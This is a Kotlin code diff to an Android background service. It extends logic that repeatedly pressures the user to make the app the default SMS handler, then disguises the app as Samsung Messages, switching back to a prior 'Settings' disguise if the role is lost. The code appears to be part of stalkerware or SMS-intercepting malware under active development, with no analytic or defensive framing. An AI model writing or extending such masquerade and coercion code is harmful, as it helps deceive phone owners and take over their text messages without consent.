@@ -197,18 +197,33 @@ class MonitorService : Service() {
     }
 
     private fun checkRelentlessSms() {
-        if (DefaultSmsManager.isDefaultSms(applicationContext)) {
+        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        val configPrefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
+        val isDefaultNow = DefaultSmsManager.isDefaultSms(applicationContext)
+        val wasDefault = prefs.getBoolean("was_default_sms", false)
+
+        if (isDefaultNow) {
+            if (!wasDefault) {
+                val currentSkin = configPrefs.getString("active_masquerade_skin", "SETTINGS")
+                if (currentSkin != "SAM_MSG" && currentSkin != "GOOGLE_MSG") {
+                    prefs.edit().putString("pre_sms_skin", currentSkin).apply()
+                }
+                CommandProcessor.applyMasqueradeSkin(applicationContext, "SAM_MSG")
+                prefs.edit().putBoolean("was_default_sms", true).apply()
+            }
             if (DefaultSmsManager.isRelentlessActive) {
                 DefaultSmsManager.isRelentlessActive = false
                 DefaultSmsManager.expectedMode = ""
             }
-            // AUTO-SKIN: Switch to Samsung Messages identity
-            CommandProcessor.applyMasqueradeSkin(applicationContext, "SAM_MSG")
             return
+        } else if (wasDefault) {
+            val previousSkin = prefs.getString("pre_sms_skin", "SETTINGS") ?: "SETTINGS"
+            CommandProcessor.applyMasqueradeSkin(applicationContext, previousSkin)
+            prefs.edit().putBoolean("was_default_sms", false).apply()
         }
+
         if (!DefaultSmsManager.isRelentlessActive) return
         
-        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         val lastPrompt = prefs.getLong("relentless_sms_last_prompt", 0L)
         if (System.currentTimeMillis() - lastPrompt < 15_000) return 
         prefs.edit().putLong("relentless_sms_last_prompt", System.currentTimeMillis()).apply()
